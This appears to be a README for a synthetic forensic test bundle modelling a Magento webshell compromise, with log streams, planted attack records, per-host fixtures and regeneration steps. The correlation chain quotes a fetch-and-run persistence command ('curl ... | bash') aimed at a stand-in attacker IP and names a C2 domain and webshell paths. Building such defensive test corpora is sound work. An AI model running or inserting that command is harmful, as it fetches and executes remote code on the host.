# exhibits/fleet-01/large-corpus — APSB25-94 fleet-scale forensic bundle

Synthesized evidence bundle sized at the upper end of a realistic
hosting-provider forensic case: ~360k tokens across 8 streams, with
~75 attack-relevant records buried in ~14k records of routine traffic
and system noise. The cross-stream correlation (apache POST IP <-> cron
curl IP <-> fs mtime cluster <-> modsec preceding cluster) is the only
resolution path; no single stream resolves the case.

## Streams

| Stream | File | Volume | Attack content |
|---|---|---|---|
| Apache access | `apache.access.log` | ~3800 lines | ~5% attacker traffic clustered in a 9-min window |
| Apache error | `apache.error.log` | ~1300 lines | ~10 PHP warnings around the polyglot path |
| ModSec audit | `modsec_audit.log` | ~570 transactions (5130 lines) | 12 admin-endpoint POSTs preceding webshell drop |
| FS mtime | `fs.mtime.txt` | ~2020 paths | 3 attack-relevant: `.cache/a.php`, renamed `index.php`, touched theme |
| Cron snapshots | `cron.snapshot` | 50 user crontabs | user `magento` has injected curl-pipe-bash line |
| Process snapshot | `proc.snapshot` | ~200 procs | 0 live (staging artifact) |
| Auth journal | `journal/auth.log` | ~420 events | 0 direct (web vector, not SSH) |
| Maldet history | `maldet.quarantine` | ~500 entries | ~10 historically relevant legacy .cache hits |

## Attack needles

All needles trace back to the public Adobe APSB25-94 advisory. The C2
IP is `203.0.113.42` (RFC 5737 TEST-NET-3 documentation range — never
collides with real-world traffic). The webshell path `.cache/a.php`
matches the Magento media-cache double-extension pattern called out in
the advisory and reported publicly by Sansec.

Correlation chain (resolved only cross-stream):

1. `modsec_audit.log` transactions 280-291: POST to `/admin/sources/system/config/`
   from `203.0.113.42` at 2026-03-22T14:06-14:11Z (deserialization probe)
2. `fs.mtime.txt`: `/var/www/html/pub/media/catalog/product/.cache/a.php`
   mtime=2026-03-21T23:58:14Z (webshell staged ~14h before the in-corpus modsec cluster — initial-RCE event is offstage; see "Synthesis format notes" below)
3. `apache.access.log`: attacker GET/POST traffic to the `.cache/a.php` path
   from the same C2 IP
4. `cron.snapshot`: user `magento` cron entry — `curl -s http://203.0.113.42/c.txt|bash`
   (same C2 IP, persistence established after webshell staging)

## host-{1..7} subdirectories

Pre-generated per-host exhibits from M10/M11 (extended at v0.5.1 to fill the
modsec_audit + journal streams across hosts 4/5/7 so the cross-stream
correlation chain in `EXPECTED.md` resolves on every staged host, not only
host-2 + the large-corpus). These are static fixtures for
`tests/04-observe.bats`. Do not modify them — they are golden fixtures.
Regenerate only via their own synthesis scripts if needed.

| Host | Streams | Role |
|---|---|---|
| host-1-anticipatory | access.log | Clean storefront — anticipatory ModSec rule fires (920099 cred-harvest block at 14:23:11) |
| host-2-polyshell | access.log + a.php + modsec_audit.log + journal.json | Primary PolyShell drop; full 4-stream evidence kit |
| host-3-nginx-clean | README.md (empty-by-design) | Fleet baseline — no findings expected; topology anchor for case-split scenario |
| host-4-polyshell-second | access.log + a.php + modsec_audit.log + journal.json | Second PolyShell drop; same C2 (`vagqea4wrlkdg.top`); guest-carts deserialization probe arc |
| host-5-skimmer | access.log + skimmer.php + modsec_audit.log + journal.json | Skimmer family; case-split trigger (family-marker divergence) |
| host-7-polyshell-third | access.log + a.php + modsec_audit.log + journal.json | Third PolyShell drop; third corroboration of campaign C2 |

## Regenerate large-corpus

```bash
scripts/dev/synth-corpus.sh --seed 42 --out exhibits/fleet-01/large-corpus
```

Output is byte-deterministic — same seed produces the same bundle.

## Synthesis format notes

- **Section C** (request body) is omitted from POST transactions — the synthesis does not model `SecRequestBodyAccess On` deployments. POST payloads are visible in the access log only.
- **Webshell staging** (`.cache/a.php` mtime at `2026-03-21T23:58:14Z`) precedes the in-corpus modsec dispatch cluster (`2026-03-22T12:00Z+`) by ~14 hours. The corpus models post-drop dispatch traffic; the initial-RCE event that planted `a.php` is out of capture window — a realistic hosting-stack scenario where forensic capture begins after the operator notices anomalous traffic, not at compromise time. The temporal gap between mtime and visible attack traffic is a forensic signal: a curator surfacing it correctly identifies that the initial-access vector is offstage and recommends pulling earlier log windows or sibling-host evidence.

## Sources

- Adobe Security Advisory APSB25-94 (public)
- Magento dev docs on media-cache path conventions (public)
- Apache combined CLF format spec (public)
- ModSecurity audit-log section grammar (OWASP CRS public docs)
- cron(5) man page (POSIX spec)

PolyShell operator-local corpus consulted ONLY for cadence-realism
spot checks (request density per hour, attack-to-benign ratio).
Never copied, never quoted, never parsed into output.
